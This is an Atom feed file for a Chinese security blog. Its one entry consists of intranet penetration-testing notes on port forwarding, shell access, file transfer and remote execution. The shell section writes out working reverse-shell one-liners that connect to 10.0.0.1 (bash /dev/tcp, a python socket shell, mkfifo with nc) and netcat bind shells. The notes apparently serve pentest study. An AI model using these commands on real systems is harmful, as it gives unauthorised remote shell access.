@@ -1,0 +1,226 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://mobius-0.github.io</id>
+    <title>Khala • Posts by &#34;代理&#34; tag</title>
+    <link href="https://mobius-0.github.io" />
+    <updated>2022-11-29T07:50:20.000Z</updated>
+    <category term="Hexo" />
+    <category term="shoya" />
+    <category term="网站" />
+    <category term="网络安全" />
+    <category term="工具" />
+    <category term="虚拟机" />
+    <category term="安全" />
+    <category term="星际争霸2" />
+    <category term="平衡" />
+    <category term="杂谈" />
+    <category term="小说" />
+    <category term="江南" />
+    <category term="龙族" />
+    <category term="动画" />
+    <category term="法律法规" />
+    <category term="XSS" />
+    <category term="漏洞" />
+    <category term="渗透测试" />
+    <category term="靶场" />
+    <category term="pikachu" />
+    <category term="虚拟化" />
+    <category term="Docker" />
+    <category term="镜像" />
+    <category term="标准" />
+    <category term="OCI" />
+    <category term="CRI" />
+    <category term="域名" />
+    <category term="DNS" />
+    <category term="WEB" />
+    <category term="HTTP" />
+    <category term="计算机网络" />
+    <category term="IPSec" />
+    <category term="VPN" />
+    <category term="SSL" />
+    <category term="TLS" />
+    <category term="WiFi" />
+    <category term="邮件" />
+    <category term="网络协议" />
+    <category term="入侵检测" />
+    <category term="IDS" />
+    <category term="IPS" />
+    <category term="防御加固" />
+    <category term="管理策略" />
+    <category term="分工" />
+    <category term="职能" />
+    <category term="情报" />
+    <category term="运营" />
+    <category term="开发过程" />
+    <category term="应急响应" />
+    <category term="流程" />
+    <category term="Linux" />
+    <category term="Windows" />
+    <category term="攻击溯源" />
+    <category term="分析模型" />
+    <category term="网络攻防" />
+    <category term="蜜罐" />
+    <category term="隐藏" />
+    <category term="诱导" />
+    <category term="防御纵深" />
+    <category term="访问控制" />
+    <category term="过滤" />
+    <category term="框架" />
+    <category term="风险" />
+    <category term="控制" />
+    <category term="渗透" />
+    <category term="信息收集" />
+    <category term="痕迹清理" />
+    <category term="内网" />
+    <category term="后门" />
+    <category term="免杀" />
+    <category term="代理" />
+    <category term="Shell" />
+    <category term="远程连接" />
+    <category term="ASP" />
+    <category term="CSharp" />
+    <category term="Golang" />
+    <category term="Java" />
+    <category term="语言" />
+    <category term="反序列化" />
+    <category term="混淆" />
+    <category term="沙箱" />
+    <category term="类" />
+    <category term="JDK" />
+    <category term="JavaScript" />
+    <category term="PHP" />
+    <category term="PowerShell" />
+    <category term="Python" />
+    <category term="Ruby" />
+    <category term="CSRF" />
+    <category term="服务器" />
+    <category term="SQL注入" />
+    <category term="SSRF" />
+    <category term="Cache" />
+    <category term="XXE" />
+    <category term="XML" />
+    <category term="Xpath" />
+    <category term="注入" />
+    <category term="函数" />
+    <category term="绕过" />
+    <category term="遍历" />
+    <category term="包含" />
+    <category term="文件" />
+    <category term="目录" />
+    <category term="读取" />
+    <category term="上传" />
+    <category term="中间件" />
+    <category term="IIS" />
+    <category term="Apache" />
+    <category term="Nginx" />
+    <category term="逻辑" />
+    <category term="策略配置" />
+    <category term="端口" />
+    <category term="社会工程学" />
+    <category term="搜索" />
+    <entry>
+        <id>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</id>
+        <title>综合技巧</title>
+        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/"/>
+        <content type="html">&lt;h1 id=&#34;端口转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口转发&#34;&gt;#&lt;/a&gt; 端口转发&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;lcx&lt;/li&gt;
+&lt;li&gt;netsh&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;portmap&lt;/li&gt;
+&lt;li&gt;iptables&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;socket 代理&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Win: xsocks&lt;/li&gt;
+&lt;li&gt;Linux: proxychains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基于 http 的转发与 socket 代理 (低权限下的渗透)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口转发: tunnasocks 代理: reGeorg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ssh 通道&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口转发 socks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;获取shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取shell&#34;&gt;#&lt;/a&gt; 获取 shell&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;常规 shell 反弹&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1
+
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;突破防火墙的 imcp_shell 反弹&lt;/li&gt;
+&lt;li&gt;正向 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;nc -e /bin/sh -lp 1234
+nc.exe -e cmd.exe -lp 1234
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;内网文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网文件传输&#34;&gt;#&lt;/a&gt; 内网文件传输&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;windows 下文件传输&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;powershell&lt;/li&gt;
+&lt;li&gt;vbs 脚本文件&lt;/li&gt;
+&lt;li&gt;bitsadmin&lt;/li&gt;
+&lt;li&gt;文件共享&lt;/li&gt;
+&lt;li&gt;使用 telnet 接收数据&lt;/li&gt;
+&lt;li&gt;hta&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;linux 下文件传输&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;python&lt;/li&gt;
+&lt;li&gt;wget&lt;/li&gt;
+&lt;li&gt;tar + ssh&lt;/li&gt;
+&lt;li&gt;利用 dns 传输数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件编译&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;powershell 将 exe 转为 txt，再 txt 转为 exe&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;远程连接-执行程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程连接-执行程序&#34;&gt;#&lt;/a&gt; 远程连接 &amp;amp;&amp;amp; 执行程序&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;at&amp;amp;schtasks&lt;/li&gt;
+&lt;li&gt;psexec&lt;/li&gt;
+&lt;li&gt;wmic&lt;/li&gt;
+&lt;li&gt;wmiexec.vbs&lt;/li&gt;
+&lt;li&gt;smbexec&lt;/li&gt;
+&lt;li&gt;powershell remoting&lt;/li&gt;
+&lt;li&gt;SC 创建服务执行&lt;/li&gt;
+&lt;li&gt;schtasks&lt;/li&gt;
+&lt;li&gt;SMB+MOF || DLL Hijacks&lt;/li&gt;
+&lt;li&gt;PTH + compmgmt.msc&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="代理" />
+        <category term="Shell" />
+        <category term="远程连接" />
+        <updated>2022-11-29T07:50:20.000Z</updated>
+    </entry>
+</feed>
